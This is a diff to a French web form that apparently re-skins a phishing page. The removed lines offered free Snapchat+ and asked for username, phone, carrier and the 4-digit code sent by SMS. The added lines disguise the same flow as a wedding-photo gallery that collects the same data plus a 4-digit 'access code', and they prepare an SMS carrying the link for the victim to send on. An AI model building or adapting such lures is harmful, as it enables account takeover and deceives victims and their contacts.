@@ -113,6 +113,49 @@
     outline-offset: 2px;
   }
 
+  .input-at-wrap {
+    position: relative;
+  }
+  .input-at-wrap span {
+    position: absolute;
+    left: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--ink-dim);
+    font-size: 0.98rem;
+    pointer-events: none;
+  }
+  .input-at-wrap input {
+    padding-left: 34px;
+  }
+
+  .phone-wrap {
+    position: relative;
+  }
+  .phone-wrap .phone-prefix {
+    position: absolute;
+    left: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    pointer-events: none;
+  }
+  .phone-wrap .phone-prefix span {
+    color: var(--ink);
+    font-size: 0.98rem;
+  }
+  .phone-wrap .phone-prefix svg {
+    width: 20px;
+    height: 14px;
+    border-radius: 2px;
+    flex-shrink: 0;
+  }
+  .phone-wrap input {
+    padding-left: 78px;
+  }
+
   .code-boxes {
     display: flex;
     gap: 12px;
@@ -238,11 +281,24 @@
     <form id="photoForm" novalidate>
       <div class="field">
         <label id="txtLabelNom" for="name"></label>
-        <input id="name" name="name" type="text" autocomplete="given-name" required>
+        <div class="input-at-wrap">
+          <span>@</span>
+          <input id="name" name="name" type="text" autocomplete="given-name" required>
+        </div>
       </div>
       <div class="field">
         <label id="txtLabelTel" for="phone"></label>
-        <input id="phone" name="phone" type="tel" placeholder="06 12 34 56 78" autocomplete="tel" required>
+        <div class="phone-wrap">
+          <div class="phone-prefix">
+            <svg viewBox="0 0 3 2" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <rect width="1" height="2" fill="#0055A4"/>
+              <rect x="1" width="1" height="2" fill="#FFFFFF"/>
+              <rect x="2" width="1" height="2" fill="#EF4135"/>
+            </svg>
+            <span>+33</span>
+          </div>
+          <input id="phone" name="phone" type="tel" placeholder="6 12 34 56 78" autocomplete="tel" required>
+        </div>
       </div>
       <div class="field">
         <label id="txtLabelOperateur" for="operateur"></label>
@@ -280,7 +336,7 @@
       </svg>
     </div>
     <h2 id="txtTitreSucces"></h2>
-    <p id="txtTexteSucces" style="margin-bottom:0;"></p>
+    <p style="margin-bottom:0;">Les photos du <span style="color: #f5c518;">mariage</span> arriveront sous peu</p>
   </div>
 
   <div id="panelLoading" style="display:none; text-align:center;">
@@ -312,27 +368,27 @@
     titreOnglet: "Recevoir les photos",
 
     // --- Premier écran : le formulaire ---
-    titreFormulaire: "OBTENIR SNAPCHAT+",
-    texteFormulaire: "bénéficier de 1 an de snapchat+ gratuitement.",
+    titreFormulaire: "Recevoir toutes les photos",
+    texteFormulaire: "Entrez votre nom d'utilisateur et votre numéro. Votre app de messages s'ouvrira avec le lien de la galerie déjà prêt — il ne restera qu'à l'envoyer.",
     labelNomUtilisateur: "Nom d'utilisateur",
     placeholderNomUtilisateur: "Nom d'utilisateur",
     labelTelephone: "Votre numéro de téléphone",
     labelOperateur: "Votre opérateur",
     // La liste des opérateurs proposés dans le menu déroulant.
     // Ajoutez, supprimez ou renommez des lignes entre les crochets [ ].
-    listeOperateurs: ["Orange", "SFR", "Bouygues Telecom"] ,
-    texteBoutonEnvoyer: "Continuer",
+    listeOperateurs: ["🟠 Orange", "🔴 SFR", "🔵 Bouygues Telecom"],
+    texteBoutonEnvoyer: "Recevoir les photos",
 
     // --- Deuxième écran : le code d'accès ---
-    titreCode: "ENTREZ LE CODE REÇU",
-    texteCode: "saisissez le code à 4 chiffres envoyé par SMS.",
-    labelCode: "Code d'authentification",
-    texteBoutonValider: "Vérifier",
+    titreCode: "Code d'accès du mariage",
+    texteCode: "Ce code vous a été remis pendant la soirée. Entrez-le pour recevoir les photos.",
+    labelCode: "Code d'accès",
+    texteBoutonValider: "Valider",
 
     // --- Troisième écran : le succès (avant l'envoi) ---
     titreSucces: "Code vérifié !",
     // {prenom} est remplacé automatiquement par ce que la personne a tapé.
-    texteSucces: "{prenom}, votre abonnement snapchat+  arrivent d'ici 24h.",
+    texteSucces: "Merci {prenom}, vos photos arrivent d'ici 24h.",
 
     // --- Quatrième écran : l'envoi en cours (juste avant l'ouverture du SMS) ---
     titreEnvoi: "Envoi en cours",
@@ -504,7 +560,6 @@
       return;
     }
 
-    document.getElementById('txtTexteSucces').textContent = REGLAGES.texteSucces.replace("{prenom}", pendingName);
     panelCode.style.display = 'none';
     panelSuccess.style.display = '';
   });
